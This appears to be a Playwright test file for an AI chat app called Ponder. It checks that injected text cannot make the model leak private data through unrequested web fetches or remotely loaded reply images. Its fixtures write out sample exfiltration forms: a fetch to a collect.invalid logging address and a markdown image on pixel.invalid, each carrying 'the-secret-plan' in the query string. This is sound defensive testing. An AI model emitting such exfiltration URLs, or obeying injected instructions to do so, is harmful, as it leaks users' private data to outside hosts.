import { chat, expect, test } from "../fixtures.ts";

/**
 * Text that a page, an email or a file puts in front of the model can tell it to send
 * private data out in an address. These tests check the two ways out that Ponder closes:
 * web_fetch to an address nobody gave (server/search/trusted-pages.ts), and an image in
 * a reply, which the browser would load by itself (the page policy in server/app.ts).
 * Addresses end in .invalid, which never resolves, so nothing leaves the machine.
 */
test.beforeEach(async ({ person, page }) => {
	void person;
	await page.goto("/");
});

test("asks before reading a page that the person did not give and no search found", async ({ page, fake }) => {
	const url = "https://collect.invalid/log?d=the-secret-plan";
	await fake.chat({
		match: "Summarise my notes",
		steps: [{ toolCalls: [{ name: "web_fetch", input: { url } }] }, { text: "I did not read that page." }],
	});

	await chat.send(page, "Summarise my notes");
	// The question shows the whole address, since data can leave in it.
	await expect(page.getByText(`Allow Ponder to read ${url}?`)).toBeVisible();
	expect(await fake.calls("Summarise my notes")).toHaveLength(1);

	await page.getByRole("button", { name: "Deny" }).click();
	await expect(chat.reply(page)).toContainText("I did not read that page.");
	expect(JSON.stringify((await fake.calls("Summarise my notes"))[1].messages)).toContain("The person denied this.");
});

test("reads a page that a search found, or that the person gave, without asking", async ({ page, fake }) => {
	const found = "https://news.invalid/vue-release";
	await fake.search({ match: "vue news", results: [{ url: found, title: "Vue news", content: "Vue 9 is out." }] });
	await fake.chat({
		match: "Read news.invalid/today",
		steps: [
			{ toolCalls: [{ name: "web_fetch", input: { url: "https://news.invalid/today" } }] },
			{ toolCalls: [{ name: "web_search", input: { query: "vue news" } }] },
			{ toolCalls: [{ name: "web_fetch", input: { url: found } }] },
			{ text: "Both pages were down." },
		],
	});

	await chat.send(page, "Read news.invalid/today and the newest vue news");
	await expect(chat.reply(page)).toContainText("Both pages were down.");
	await expect(page.getByRole("button", { name: "Deny" })).toHaveCount(0);
	// Each fetch ran: the model got its result, an error from the address that does not resolve.
	const calls = await fake.calls("Read news.invalid/today");
	expect(calls).toHaveLength(4);
	expect(JSON.stringify(calls[3].messages)).toContain("Could not read the page");
});

test("does not load an image from another site in a reply", async ({ page, fake }) => {
	const response = await page.request.get("/");
	expect(response.headers()["content-security-policy"]).toContain("img-src 'self'");

	let requested = 0;
	await page.route("https://pixel.invalid/**", (route) => {
		requested++;
		return route.abort();
	});
	const blocked = page.waitForEvent("console", (message) => /Content Security Policy/.test(message.text()));
	await fake.chat({ match: "Show the chart", steps: [{ text: "Here it is: ![chart](https://pixel.invalid/c.png?d=the-secret-plan)" }] });

	await chat.send(page, "Show the chart");
	await expect(chat.reply(page).locator('img[src^="https://pixel.invalid/"]')).toHaveCount(1);
	await blocked;
	expect(requested).toBe(0);
});
